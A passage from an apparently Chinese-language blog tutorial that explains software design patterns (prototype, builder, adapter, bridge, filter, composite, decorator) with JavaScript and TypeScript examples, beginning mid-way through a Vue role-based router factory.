&quot;superAdmin&quot;: return &#123; name: &quot;SuperAdmin&quot;, route: AllRouter &#125;; break; case &quot;Teacher&quot;: return &#123; name: &quot;Teacher&quot;, // 将不属于该类型用户的导航去掉 route: AllRouter.slice(1) &#125;; break; case &quot;Student&quot;: return &#123; name: &quot;Student&quot;, route: AllRouter.slice(2) &#125;; break; default: throw new Error(&#x27;参数错误! 可选参数: superAdmin, Teacher, Student&#x27;) &#125;&#125;export &#123; routerFactory &#125; 在登录组件的事件中调用路由工厂得到路由： 点击查看代码 123456789101112131415// Login.vue&lt;script lang=&#x27;js&#x27; setup&gt;import &#123; routerFactory &#125; from &quot;../router/routerFactory.js&quot;const router = useRouter()const getRouter = (role) =&gt; &#123; let routerObj = routerFactory(role) // 动态添加路由 router.addRoute(routerObj) // 进行页面跳转 router.push(&#123;name: routerObj.name&#125;)&#125;&lt;/script&gt; 但在实际项目中，因为使用addRoute方法添加的路由刷新后不能保存，所以会导致路由无法访问。通常的做法是本地加密保存用户信息，在刷新后获取本地权限并解密，根据权限重新添加路由。 实际上JQuery中的$(selector)，React中的createElement()都是工厂方法。 $()利用我们提供的信息创建JQuery对象并返回 createElement()利用我们提供的信息创建Vnode对象并返回 原型设计模式 对于前端程序员而言，原型设计模式可谓非常熟悉了，JS的原型链就是以原型设计模式设计的。 因此对一这部分的理解可以直接借用JS原型链的知识，原型编程泛型的基本规则是： 所有数据都是对象 要得到一个对象，不是通过实例化类，而是找到一个对象作为原型，并克隆他它 对象会记住它的原型 如果对象无法响应某个请求，则会把这个请求委托给自己的原型 是不是很熟悉，new方法实际上是一个很好的例子，我们可以借助new方法源码的方法实现一个这个克隆的过程： 点击查看代码 123456789101112131415161718192021222324class shape &#123; constructor() &#123; this.id = null this.type = null &#125; getType()&#123; return this.type; &#125; getId() &#123; return this.id; &#125; setId(id) &#123; this.id = id; &#125; clone() &#123; // 创建空对象 let res = &#123;&#125; // 绑定原型 res.__proto__ = this.__proto__ // 改变this指向 this.__proto__.constructor.call(res) return res &#125;&#125; 接下来我们就可以使用原型继承的方式创建一些类对象： 点击查看代码 123456789101112131415161718192021222324252627function Rectangle() &#123; this.type = &quot;Rectangle&quot;&#125;// 绑定原型Rectangle.prototype.__proto__ = new Shape()// 绑定静态方法Rectangle.prototype.draw = () =&gt; &#123;console.log(&quot;Rectangle!&quot;)&#125;function Square() &#123; this.type = &quot;Square&quot;&#125;// 绑定原型Square.prototype.__proto__ = new Shape()// 绑定静态方法Square.prototype.draw = () =&gt; &#123;console.log(&quot;Square!&quot;)&#125;function Circle() &#123; this.type = &quot;Circle&quot;&#125;// 绑定原型Circle.prototype.__proto__ = new Shape()// 绑定静态方法Circle.prototype.draw = () =&gt; &#123;console.log(&quot;Circle!&quot;)&#125; 创建好了类以后我们就可以尝试对类进行实例化，由上面的描述我们知道实例化的过程是通过找到一个对象，然后克隆得到的，为了实现’找到一个对象’的过程，我们需要模拟一个cache： 点击查看代码 1234567891011121314151617181920212223242526272829303132333435363738class ShapeCache &#123; static getShape(shapeId) &#123; const cachedShape = ShapeCache.shapeMap.get(shapeId); return cachedShape.clone(); &#125; static loadCache() &#123; const circle = new Circle(); circle.setId(&quot;1&quot;); ShapeCache.shapeMap.set(circle.getId(),circle); const square = new Square(); square.setId(&quot;2&quot;); ShapeCache.shapeMap.set(square.getId(),square); const rectangle = new Rectangle(); rectangle.setId(&quot;3&quot;); ShapeCache.shapeMap.set(rectangle.getId(),rectangle); &#125; &#125; ShapeCache.shapeMap = new Map(); ShapeCache.loadCache();const clonedShape = ShapeCache.getShape(&quot;1&quot;);console.log(&quot;Shape : &quot; + clonedShape.getType()); const clonedShape2 = ShapeCache.getShape(&quot;2&quot;);console.log(&quot;Shape : &quot; + clonedShape2.getType()); const clonedShape3 = ShapeCache.getShape(&quot;3&quot;);console.log(&quot;Shape : &quot; + clonedShape3.getType());/** * output: * Shape : Circle * Shape : Square * Shape : Rectangle */ 在其它编程中使用原型模式的优势是使用更小的代价来创建对象，通过原型引用的方式而不是开辟新的空间。 JS在设计之初就是采用的原型链继承的方式，直接new就进行了克隆的操作，所以对比其它语言创建大对象的性能，能高出不少。 生成器设计模式 使用简单的对象组合成复杂的对象 这里我们用快餐举例，如果我们希望但开一家快餐店，那么各种套餐都是由不同种类的冷饮和汉堡组合而成。同时冷饮需要瓶子装，汉堡需要纸盒包住，那么我们可以先定义冷饮和汉堡类和它们所需要的瓶子和纸盒。 下面是生成器模式的类图： 生成器模式类图 主管（Director）类定义调用构造步骤的顺序，这样就可以创建和复用特定的产品配置。 生成器（Builder）接口声明在所有类型生成器中通用的产品构造步骤。 具体生成器（Concrete Builders）提供构造过程的不同实现。 具体生成器也可以构造不遵循通用接口的产品。 点击查看代码 123456789101112131415161718192021222324// 纸盒class Wrapper &#123; pack() &#123; return &quot;Wrapper&quot; &#125;&#125;// 水杯class Bottle&#123; pack() &#123; return &quot;Bottle&quot; &#125;&#125;// 汉堡需要纸盒包住class Burger &#123; packing() &#123; return new Wrapper() &#125;&#125;// 饮料需要水杯class Drink &#123; packing() &#123; return new Bottle() &#125;&#125; 如果在这个基础上，我们想要提供不同类别的汉堡与饮料我们可以根据基类进行派生： 点击查看代码 123456789101112131415161718192021222324252627// 各种生成器class VegBurger extends Burger &#123; price() &#123; return 25.0 &#125; name() &#123; return &quot;Veg Burger&quot; &#125;&#125;class ChickenBurger extends Burger &#123; price() &#123; return 50.0 &#125; name() &#123; return &quot;Chicken Burger&quot; &#125;&#125;class Coke extends Drink &#123; price() &#123; return 3.0 &#125; name() &#123; return &quot;Coke&quot; &#125;&#125; 之后我们可以在这个的基础上构建一些套餐，以便用户进行选择： 点击查看代码 1234567891011121314151617181920212223242526272829class Meal &#123; constructor() &#123; const items = [] // 使用defineProperty代理定义属性操作 Reflect.defineProperty(this, &#x27;items&#x27;, &#123; get: () =&gt; &#123; if(this.__proto__ !== Meal.prototype) &#123; throw new Error(&#x27;items is private!&#x27;); &#125; return items &#125; &#125;) &#125; addItem(item) &#123; this.items.push(item) &#125; getCost() &#123; let cost = 0.0 this.items.forEach((item) =&gt; &#123; cost += item.price() &#125;) &#125; showItems() &#123; this.items.forEach((item) =&gt; &#123; console.log(`Item: $&#123;item.name()&#125;;Packing: $&#123;item.packing.pack&#125;;Price: $&#123;item.price()&#125;`) &#125;) &#125;&#125; 接下来我们可以利用工厂设计模式，为套餐创建工厂，避免繁杂的对象构建： 点击查看代码 123456789101112131415161718192021222324252627282930313233343536373839404142// 主管类class MealBuilder &#123; prepareVegMeal() &#123; const meal = new Meal() meal.addItem(new VegBurger()); meal.addItem(new Coke()); return meal &#125; prepareChickenMeal() &#123; const meal = new Meal() meal.addItem(new ChickenBurger()); meal.addItem(new Coke()); return meal &#125;&#125;// 使用const mealBuilder = new MealBuilder()const vegMeal = mealBuilder.prepareVegMeal()console.log(&quot;Veg Meal:&quot;)vegMeal.showItems()console.log(&quot;Total Cost: &quot; +vegMeal.getCost());const chickenMeal = mealBuilder.prepareChickenMeal()console.log(&quot;Chicken Meal:&quot;)chickenMeal.showItems()console.log(&quot;Total Cost: &quot; +chickenMeal.getCost());/** * output: * Veg Meal * Item : Veg Burger,Packing : Wrapper,Price : 25 * Item : Coke,Packing : Bottle,Price : 3 * Total Cost: 28 * * Chicken Meal * Item : Chicken Burger,Packing : Wrapper,Price : 50 * Item : Coke,Packing : Bottle,Price : 3 * Total Cost: 53 */ 这是一种创建复杂对象的最佳实践。尤其是复杂对象多变的情况下，通过基础组件来组合，在基础组件变更时，多种依赖于基础组件的复杂组件也能方便变更，而不需要更改多种不同的复杂组件。 结构型模式 其描述 如何将类或者对 象结合在一起形成更大的结构 ，就像搭积木，可以通过 简单积木的组合形成复杂的、功能更为强大的结构。 结构型模式可以分为 类结构型模式 和 对象结构型模式 ： • 类结构型模式关心类的组合 ，由多个类可以组合成一个更大的系统，在类结构型模式中一般只存在继承关系和实现关系。 • 对象结构型模式关心类与对象的组合，通过关联关系使得在一个类中定义另一个类的实例对象，然后通过该对象调用其方法。 根据“合成复用原则”，在系统中尽量使用关联关系来替代继承关系，因此大部分结构型模式都是 对象结构型模式 。 适配器模式 适配器模式是一种结构型设计模式， 它能使接口不兼容的对象能够相互合作。 我们从实际问题出发理解适配器设计模式： 现在我们有一个数据展示平台，有一个需求是将股票数据展示的业务整合到原有平台中，我们决定使用第三方库对股票信息进行分析后进行展示。 那么问题来了，我们使用的第三方库要求以Json格式输入，但从数据提供方取得的数据是XML格式的，我们该怎么办 我们当然可以修改第三方库中的代码让他支持，但有时第三方库的原码并没有那么好取得，也没有那么好修改。 于是，我们想到可以创建一个适配器，对格式进行转换后，输入给第三方库。 适配器流程 适配器不仅可以转换不同格式的数据， 其还有助于采用不同接口的对象之间的合作。 它的运作方式如下： 适配器实现与其中一个现有对象兼容的接口。 现有对象可以使用该接口安全地调用适配器方法。 适配器方法被调用后将以另一个对象兼容的格式和顺序将请求传递给该对象。 有时你甚至可以创建一个双向适配器来实现双向转换调用。 对象适配器 实现时使用了构成原则： 适配器实现了其中一个对象的接口， 并对另一个对象进行封装。 所有流行的编程语言都可以实现适配器。 对象适配器类图 类适配器 下列适配器模式演示基于经典的 “方钉和圆孔” 问题。 类适配器类图 适配器假扮成一个圆钉 （Round­Peg）， 其半径等于方钉 （Square­Peg） 横截面对角线的一半 （即能够容纳方钉的最小外接圆的半径）。 使用场景 当你希望使用某个类， 但是其接口与其他代码不兼容时， 可以使用适配器类 适配器模式允许你创建一个中间层类， 其可作为代码与遗留类、 第三方类或提供怪异接口的类之间的转换器。 如果您需要复用这样一些类， 他们处于同一个继承体系， 并且他们又有了额外的一些共同的方法， 但是这些共同的方法不是所有在这一继承体系中的子类所具有的共性。 你可以扩展每个子类， 将缺少的功能添加到新的子类中。 但是， 你必须在所有新子类中重复添加这些代码， 这样会使得代码有坏味道。将缺失功能添加到一个适配器类中是一种优雅得多的解决方案。 然后你可以将缺少功能的对象封装在适配器中， 从而动态地获取所需功能。 如要这一点正常运作， 目标类必须要有通用接口， 适配器的成员变量应当遵循该通用接口。 这种方式同装饰模式非常相似。 下面大件一个场景来写一个简单的demo吧。 我们知道音频文件有vlc,mp3,mp4等多种不同的文件，不同的文件需要使用不同的播放器大概并播放，但随着文件编码方式的进步，未来将会有更多编码类型的音频文件流行，那么我们希望设计一个播放器可以同时播放不同格式的文件。 通过上面的分析我们知道，此处是使用适配器模式的好时候，我们为播放器设计一个适配器来处理不同格式的文件： 点击查看代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768class VlcPlayer &#123; playVlc(fileName) &#123; console.log(`Vlc file:$&#123;fileName&#125; is playing`) &#125;&#125;class Mp3Player &#123; playMp3(fileName) &#123; console.log(`Mp3 file:$&#123;fileName&#125; is playing`) &#125;&#125;class Mp4Player &#123; playMp4(fileName) &#123; console.log(`Mp4 file:$&#123;fileName&#125; is playing`) &#125;&#125;class MediaAdapter &#123; constructor(audioType) &#123; switch(audioType) &#123; case &#x27;vlc&#x27;: MediaAdapter.MusicPlayer = new VlcPlayer() break; case &#x27;mp3&#x27;: MediaAdapter.MusicPlayer = new Mp3Player() break; case &#x27;mp4&#x27;: MediaAdapter.MusicPlayer = new Mp4Player() break; &#125; &#125; play(audioType, fileName) &#123; switch(audioType) &#123; case &#x27;vlc&#x27;: MediaAdapter.MusicPlayer.playVlc(fileName) break; case &#x27;mp3&#x27;: MediaAdapter.MusicPlayer.playMp3(fileName) break; case &#x27;mp4&#x27;: MediaAdapter.MusicPlayer.playMp4(fileName) break; &#125; &#125;&#125;class AudioPlayer &#123; play(audioType, fileName) &#123; switch(audioType) &#123; case &#x27;vlc&#x27;: case &#x27;mp3&#x27;: case &#x27;mp4&#x27;: AudioPlayer.mediaAdapter = new MediaAdapter(audioType) AudioPlayer.mediaAdapter.play(audioType, fileName) break; default: console.log(`sorry this type is not supported yet`) break; &#125; &#125;&#125;const audioPlayer = new AudioPlayer();audioPlayer.play(&#x27;mp3&#x27;, &#x27;fly me to the moon.mp3&#x27;) // Mp3 file: fly me to the moon.mp3 is playingaudioPlayer.play(&#x27;vlc&#x27;, &#x27;high way to hell.vlc&#x27;) // Vlc file: high way to hell.vlc is playingaudioPlayer.play(&#x27;mp4&#x27;, &#x27;help.mp4&#x27;) // Mp4 file: help.mp4 is playing 桥接模式 桥接模式也叫桥梁模式，将实现与抽象放在两个不同的层次中，使得两者可以独立地变化。(最主要的将实现和抽象两个层次划分开来) 桥接模式将类分为了抽象与实现两个层次，其中抽象类作为桥梁定义角色的行为并保存一个实现类的引用。然后为了规范实现类具备的功能，实现类需要实现一个统一的interface 就好比GUI和API，用户操作的是GUI，GUI充当用户和系统之间的桥梁，调用各种API来处理具体的事物。 下面我们用一个小例子来体会一下，现在我们有两套播放设备，一套是tv，另一套是radio，客户希望可以对他们进行控制。此时我们通过创建一个抽象类RemoteControl来向用户提供一些操作接口，然后在这些接口中调用实现类的方法完成这些操作，这样就可以将用户和设配联系在一起了。 该场景下类图如下： 桥接设计模式类图 点击查看代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137// 实现类 的接口interface Device &#123; isEnabled(): boolean; enable(): void; disable(): void; getVolume(): number; setVolume(number): void; getChannel(): number; setChannel(number): void; getName(): string;&#125;// 实现类1class Tv implements Device &#123; private name: &quot;Tv&quot;; private state: &quot;close&quot; | &quot;open&quot;; private volume: number; private channel: number; constructor() &#123; this.name = &quot;Tv&quot;; this.state = &quot;close&quot;; this.volume = 0; this.channel = 0; &#125; isEnabled(): boolean &#123; return this.state === &quot;open&quot;; &#125; enable(): void &#123; this.state = &quot;open&quot;; &#125; disable(): void &#123; this.state = &quot;close&quot;; &#125; getVolume(): number &#123; return this.volume; &#125; setVolume(number: any): void &#123; this.volume += number; this.volume = this.volume &gt; 100 ? 100 : this.volume; this.volume = this.volume &lt; 0 ? 0 : this.volume; &#125; getChannel(): number &#123; return this.channel; &#125; setChannel(number: any): void &#123; this.channel += number; this.channel = this.channel &lt; 0 ? 0 : this.channel; &#125; getName(): string &#123; return this.name; &#125;&#125;// 实现类2class Radio implements Device &#123; private name: &quot;Radio&quot;; private state: &quot;close&quot; | &quot;open&quot;; private volume: number; private channel: number; constructor() &#123; this.name = &quot;Radio&quot;; this.state = &quot;close&quot;; this.volume = 0; this.channel = 0; &#125; isEnabled(): boolean &#123; return this.state === &quot;open&quot;; &#125; enable(): void &#123; this.state = &quot;open&quot;; &#125; disable(): void &#123; this.state = &quot;close&quot;; &#125; getVolume(): number &#123; return this.volume; &#125; setVolume(number: any): void &#123; this.volume += number; this.volume = this.volume &gt; 100 ? 100 : this.volume; this.volume = this.volume &lt; 0 ? 0 : this.volume; &#125; getChannel(): number &#123; return this.channel; &#125; setChannel(number: any): void &#123; this.channel += number; this.channel = this.channel &lt; 0 ? 0 : this.channel; &#125; getName(): string &#123; return this.name; &#125;&#125;// 抽象类// 它定义了两个类层次结构中“控制”部分的接口。// 它管理着一个指向实现类对象的引用，并会将所有真实工作委派给该对象。// 它扮演了一个桥梁的作用，将用户和device连接起来class RemoteControl &#123; private device: Device; constructor(device: Device) &#123; this.device = device; &#125; togglePower() &#123; console.log(`toggle $&#123;this.device.getName()&#125; power`); if (this.device.isEnabled()) this.device.disable(); else this.device.enable(); &#125; volumeDown() &#123; this.device.setVolume(this.device.getVolume() - 10); &#125; volumeUp() &#123; this.device.setVolume(this.device.getVolume() + 10); &#125; channelDown() &#123; this.device.setChannel(this.device.getChannel() - 10); &#125; channelUp() &#123; this.device.setChannel(this.device.getChannel() + 10); &#125;&#125;const tv = new Tv();const tvRemote = new RemoteControl(tv);tvRemote.togglePower(); // toggle Tv powerconst radio = new Radio();const radioRemote = new RemoteControl(radio);radioRemote.togglePower(); // toggle Radio power 适用场景 如果你想要拆分或重组一个具有多重功能的庞杂类 （例如能与多个数据库服务器进行交互的类）， 可以使用桥接模式。 这样一来能够减少类的代码行数，提升代码可读性，此后，可以修改任意一个类层次结构而不会影响到其他类层次结构。 如果你希望在几个独立维度上扩展一个类，可使用该模式。 桥接建议将每个维度抽取为独立的类层次。初始类将相关工作委派给属于对应类层次的对象， 无需自己完成所有工作。 如果你需要在运行时切换不同实现方法，可使用桥接模式。 桥接模式可替换抽象类中的实现类对象。 缺点 对高内聚的类使用该模式可能会让代码更加复杂。 Combo 当抽象类只与特定的实现类组合时，可以将桥接模式与抽象工厂模式进行结合，抽象工厂负责对某些关系进行封装，对客户段隐藏其复杂性 生成器模式也能与桥接模式很好的组合，例如我们可以让主管类负责抽象类的工作，让各种不用的生成器类负责实现类的工作。 过滤器模式 过滤器模式用来操作一组对象，允许开发者使用不同标准对这组对象进行过滤从而得到不同的集合，该模式通过逻辑运算以解耦的方式把它们连接起来 参与过滤器设计模式中的角色包括： 抽象过滤器角色(AbstractFilter): 负责定义过滤器的实现接口 具体过滤器角色(ConcreteFilter): 负责具体的过滤器实现，最后返回一个过滤后的数据集合，标准过滤器只对数据进行过滤，当然也能对集合中的数据进行预处理，在将处理好的数据行程集合返回 被过滤对象(Subject): 具体的被过滤对象 过滤器模式类图 类图中Criteria扮演抽象过滤器的角色Person扮演被过滤对象，其余均为实现对象。 我们根据上述类图来实现一个过滤器模式，首先我们来实现一个被过滤对象： 点击查看代码 1234567891011121314151617// 被过滤对象class Person &#123; constructor(name, gender, maritalStatus) &#123; this.name = name; this.gender = gender; this.maritalStatus = maritalStatus; &#125; getName() &#123; return this.name &#125; getGender() &#123; return this.gender &#125; getMaritalStatus() &#123; return this.maritalStatus &#125;&#125; 接下来我们对过滤器对象进行实现，这个过程我们需要实现一个接口，随后根据结构实现一系列具体过滤器，我们还可以利用处理结合的方式，例如与、或操作，构造更为复杂的筛选条件： 点击查看代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879interface Criteria &#123; /** * meetCriteria */ meetCriteria(persons: Array&lt;Person&gt;): Array&lt;Person&gt;;&#125;class CriteriaMale implements Criteria &#123; public meetCriteria(persons: Array&lt;Person&gt;) &#123; return persons.filter((person: Person) =&gt; &#123; if (person.getGender().toUpperCase() === &quot;MALE&quot;) &#123; return true; &#125; &#125;); &#125;&#125;class CriteriaFemale implements Criteria &#123; public meetCriteria(persons: Array&lt;Person&gt;) &#123; return persons.filter((person: Person) =&gt; &#123; if (person.getGender().toUpperCase() === &quot;FEMALE&quot;) &#123; return true; &#125; &#125;); &#125;&#125;class CriteriaSingle implements Criteria &#123; public meetCriteria(persons: Array&lt;Person&gt;): Person[] &#123; return persons.filter((person: Person) =&gt; &#123; if (person.getMaritalStatus().toUpperCase() === &quot;SINGLE&quot;) &#123; return true; &#125; &#125;); &#125;&#125;// 与筛选class AndCriteria implements Criteria &#123; private criteria: Criteria; private otherCriteria: Criteria; constructor(criteria: Criteria, otherCriteria: Criteria) &#123; this.criteria = criteria; this.otherCriteria = otherCriteria; &#125; public meetCriteria(persons: Array&lt;Person&gt;): Person[] &#123; const middleArray = this.criteria.meetCriteria(persons); return this.otherCriteria.meetCriteria(middleArray); &#125;&#125;// 或筛选class OrCriteria implements Criteria &#123; private criteria: Criteria; private otherCriteria: Criteria; constructor(criteria: Criteria, otherCriteria: Criteria) &#123; this.criteria = criteria; this.otherCriteria = otherCriteria; &#125; public meetCriteria(persons: Array&lt;Person&gt;): Person[] &#123; const result: Array&lt;Person&gt; = []; const firstArray = this.criteria.meetCriteria(persons); const secondArray = this.otherCriteria.meetCriteria(persons); firstArray.forEach((person: Person) =&gt; &#123; result.push(person); &#125;); secondArray.forEach((person: Person) =&gt; &#123; result.push(person); &#125;); return result &#125;&#125; 随后我们就可以使用这些过滤器来处理一个目标集合了： 点击查看代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263const showPersons = (persons: Array&lt;Person&gt;) =&gt; &#123; persons.forEach((person, index) =&gt; &#123; console.log(person.getName()); &#125;);&#125;;const personList = new Array&lt;Person&gt;();personList.push(new Person(&quot;Robert&quot;, &quot;Male&quot;, &quot;Single&quot;));personList.push(new Person(&quot;John&quot;, &quot;Male&quot;, &quot;Married&quot;));personList.push(new Person(&quot;Laura&quot;, &quot;Female&quot;, &quot;Married&quot;));personList.push(new Person(&quot;Diana&quot;, &quot;Female&quot;, &quot;Single&quot;));personList.push(new Person(&quot;Mike&quot;, &quot;Male&quot;, &quot;Single&quot;));personList.push(new Person(&quot;Bobby&quot;, &quot;Male&quot;, &quot;Single&quot;));const maleCriteria = new CriteriaMale();const femaleCriteria = new CriteriaFemale();const singleCriteria = new CriteriaSingle();const singleAndMale = new AndCriteria(singleCriteria, maleCriteria);const singleOrFemale = new OrCriteria(singleAndMale, femaleCriteria);console.log(&quot;Males: &quot;);showPersons(maleCriteria.meetCriteria(personList));/** * Males: * Robert * John * Mike * Bobby */console.log(&quot;Females: &quot;);showPersons(femaleCriteria.meetCriteria(personList));/** * Females: * Laura * Diana */console.log(&quot;Singles: &quot;);showPersons(singleCriteria.meetCriteria(personList));/** * Singles: * Robert * Diana * Mike * Bobby */console.log(&quot;Single And Males: &quot;);showPersons(singleAndMale.meetCriteria(personList));/** * Single And Males: * Robert * Mike * Bobby */console.log(&quot;Single Or Females: &quot;);showPersons(singleOrFemale.meetCriteria(personList));/** * Robert * Mike * Bobby * Laura * Diana */ 优势 在需要做类的筛选的时候，通过每次单一功能的筛选，再做聚合能极大的降低筛选功能的复杂性。 组合设计模式 组合模式是一种结构型设计模式， 你可以使用它将对象组合成树状结构， 并且能像使用独立对象一样使用它们。 下面我们假设这样一个场景：我们有一些产品和一些盒子，一个盒子里可以装多个产品，或多个较小的盒子，以此类推。现在我们的订单系统需要支持无盒子包装的单一产品，也需要支持一个包含内部所有东西的盒子。 对于后者我们应该如何得到这个盒子的订单总价呢？ 我们当然可以使用DFS等算法计算，但更好的方法是利用类似记忆化搜索的方法让每个盒子负责计算他内部的产品的价格，以此类推。 这样设计最大优点在于无需了解构成树状结构的对象的具体类。也无需了解对象是简单的产品还是复杂的盒子。 你只需调用通用接口以相同的方式对其进行处理即可。当你调用该方法后，对象会将请求沿着树结构传递下去。 组合结构类图如下： 组合设计模式类图 组件Component描述了树结构上每个节点共有的方法 叶节点Leaf是树的基本结构，不包含子项，树中实际完成工作的单元，无法将工作指派给其他人 容器Composite用来包含其他容器和叶节点，容器无需了解组成自己的子项的具体类型，收到工作请求后，将其派发给子项完成，然后处理中间结果返回给上级 接下来我们用组合设计模式来实现一个文件树的小案例。 首先我们有文件和文件夹两周类型，文件夹里可以包含其他文件夹。另外为了方便地查看文件，每个文件夹和文件需要包含： 文件名 文件大小 一个getName方法来输出自身的名称 一个getSize方法来计算自身的体积 display方法来输出自身以及自身包含的文件或文件夹 可以想到display和getSize两个方法是需要根节点派发任务到子节点才能实现的。 那么首先我们可以实现一个接口来定义文件、文件夹等组件的共有方法： 点击查看代码 1234567// 组件接口interface Component &#123; getName(): string; getSize(): number; // 缩进数量 display(indentation: number): void;&#125; 随后利用组件接口我们来实现一下文件类和文件夹类，文件夹类需要一个Component数组： 点击查看代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364// 叶子节点：文件class MyFile implements Component &#123; private name: string; private size: number; constructor(name: string, size: number) &#123; this.name = name; this.size = size; &#125; getName(): string &#123; return this.name; &#125; getSize(): number &#123; return this.size; &#125; display(indentation: number): void &#123; let tabLine = &quot;&quot;; for (let i = 0; i &lt; indentation; i++) tabLine += &quot; &quot;; console.log(tabLine + this.name, &quot; Size: &quot; + this.getSize()); &#125;&#125;// 组合节点：文件夹class Folder implements Component &#123; private name: string; private size: number; private children: Array&lt;Component&gt; = []; constructor(name: string, children: Array&lt;Component&gt; = []) &#123; this.name = name; this.children = children; this.size = this.getSize(); &#125; getName(): string &#123; return this.name; &#125; getSize(): number &#123; this.size = this.children.reduce((pre, cur) =&gt; pre + cur.getSize(), 0); return this.size; &#125; add(child: Component): void &#123; this.children.push(child); &#125; remove(child: Component): void &#123; const childIndex = this.children.indexOf(child); if (childIndex !== -1) &#123; this.children.splice(childIndex, 1); &#125; &#125; display(indentation: number): void &#123; let tabLine = &quot;&quot;; for (let i = 0; i &lt; indentation; i++) tabLine += &quot; &quot;; console.log(tabLine + this.name, &quot; Size: &quot; + this.getSize()); this.children.forEach((component: Component, index) =&gt; &#123; component.display(indentation + 4); &#125;); &#125;&#125; 最后我们就可以利用这些类来构造一个目录了，利用display方法可以显示出层级结构以及文件大小： 123456789101112131415161718192021222324const file1 = new MyFile(&quot;file1.txt&quot;, 12);const file2 = new MyFile(&quot;file2.txt&quot;, 13);const folder1 = new Folder(&quot;Folder 1&quot;);const folder2 = new Folder(&quot;Folder 2&quot;);folder1.add(file1);folder1.add(file2);folder2.add(new MyFile(&quot;file3.txt&quot;, 30));const rootFolder = new Folder(&quot;Root&quot;);rootFolder.add(folder1);rootFolder.add(folder2);console.log(&quot;File system structure:&quot;);rootFolder.display(0);/** * File system structure: * Root Size: 55 * Folder 1 Size: 25 * file1.txt Size: 12 * file2.txt Size: 13 * Folder 2 Size: 30 * file3.txt Size: 30 */ 优势 让相互关联的对象产生了结构性，无论是在关系修改或者是关系直观性上，都只需要关心当前下级的关系，这样能更好的降低关系和关系之间的复杂度，加强单对象关系结构的可维护性。[引用自zy445566的design-pattern-in-javascript库] 由此可以引申出两种应用场景： 实现特定的树形对象结构时 需要使用相同的操作处理对象时，共用同一接口，此时就无需关注对象的具体实现 组合设计模式符合开闭原则。其无需更改现有代码，就可以在应用中添加新元素，使其成为对象树的一部分。[引用自重构大师] Combo 在使用组合设计模式构造结构复杂的树时，可以使用生成器模式让树的构造以递归的形式进行 责任链模式通常和组合模式结合使用。在这种情况下，叶组件接收到请求后， 可以将请求沿包含全体父组件的链一直传递至对象树的底部。 可以使用迭代器模式来遍历组合树。 你可以使用访问者模式对整个组合树执行操作。 你可以使用享元模式实现组合树的共享叶节点以节省内存。 组合和装饰模式的结构图很相似， 因为两者都依赖递归组合来组织无限数量的对象。 装饰类似于组合， 但其只有一个子组件。 此外还有一个明显不同： 装饰为被封装对象添加了额外的职责， 组合仅对其子节点的结果进行了 “求和”。 但是， 模式也可以相互合作： 你可以使用装饰来扩展组合树中特定对象的行为。 大量使用组合和装饰的设计通常可从对于原型模式的使用中获益。可以通过该模式来复制复杂结构，而非从零开始重新构造。 装饰设计模式 装饰模式是一种结构型设计模式， 允许你通过将对象放入包含行为的特殊封装对象中来为原对象绑定新的行为。 我们考虑以下场景： 首先公司原本有一个用于发送通知到邮箱的Notifier类 现在由于社会的发展，社交媒体开始流行，手机得到普及，公司需要丰富通知类的功能，需要新增： 发送通知到短信的类 发送通知到微信的类 发送通知到QQ的类 能同时发送到微信和QQ的类 能同时发送到短信和微信的类 … 我们当然可以为每种发送方式基于Notifier类创建子类，但每种情况都需要创建特殊的子类，这样会是的子类数量爆炸： 子类组合爆炸 除了继承以外，面向对象中还有两个重要的概念：聚合以及组合，两者都是使一个对象包含另一个对象的引用，并将部分任务委托给引用对象完成。 而继承则是子类自身完全负责完成工作。 聚合： 对象 A 包含对象 B； B 可以独立于 A 存在。 组合： 对象 A 由对象 B 构成； A 负责管理 B 的生命周期。 B 无法独立于A 存在。 在装饰设计模式中真正实现上述功能的对象我们称之为装饰器，一个装饰器需要与其分装对象实现相同的接口，这样在用户的视角下，装饰器和引用成员变量是完全一样的减少心智负担。而装饰器中的对象，可以是实现了相同接口的任意对象，这样就可以将一个对象放入多个封装器中，并在对象中添加所有这些装饰器的组合行为。 那上文提到的通知类来举例，我们可以将邮件通知行为放在基类中，将其他通知方式放入装饰器中： 通知装饰器 当我们需要使用不同装饰器组合的时候，我们可以用嵌套的方式用装饰器构造装饰器，结构就像一个栈： 装饰器组合 最终用户会拿到最后一个构造的装饰器，而由于所有装饰器均实现了同一接口，用户并不需要知道这个装饰器内部有多少层嵌套，直接使用send()方法即可。 装饰器模式类图 下面我们再通过装饰设计模式实现一个文件读取写入的类，加深理解。 点击查看代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105// 部件 （Component）: 数据源// 声明封装器和被封装对象的公用接口。interface DataSource &#123; writeData(data: string): void; readData(): string;&#125;// 具体部件 （Concrete Component） 类：文件数据源// 被封装对象所属的类。 它定义了基础行为， 但装饰类可以改变这些行为。class FileDataSource implements DataSource &#123; private filename: string; constructor(filename: string) &#123; this.filename = filename; &#125; writeData(data: string): void &#123; console.log(data + &quot; 数据已写入&quot;); &#125; readData(): string &#123; return this.filename; &#125;&#125;// 装饰器基类class DataSourceDecorator implements DataSource &#123; protected wrapper: DataSource; constructor(wrapper: DataSource) &#123; this.wrapper = wrapper; &#125; writeData(data: string): void &#123; this.wrapper.writeData(data); &#125; readData(): string &#123; return this.wrapper.readData(); &#125;&#125;// 具体装饰器: 加密器class EncryptionDecorator extends DataSourceDecorator &#123; writeData(data: string): void &#123; data = data + &quot; 数据已加密&quot;; this.wrapper.writeData(data); // this.wrapper.writeData(data) &#125; readData(): string &#123; let readData = this.wrapper.readData(); readData = readData + &quot; 数据已解密&quot;; return readData; &#125;&#125;// 具体装饰器: 压缩器class CompressionDecorator extends DataSourceDecorator &#123; writeData(data: string): void &#123; data = data + &quot; 数据已压缩&quot;; this.wrapper.writeData(data); &#125; readData(): string &#123; let zipData = this.wrapper.readData(); zipData = zipData + &quot; 数据已解压&quot;; return zipData; &#125;&#125;// 具体引用类：薪资文件管理class SalaryManager &#123; private source: DataSource; constructor(source: DataSource) &#123; this.source = source; &#125; load() 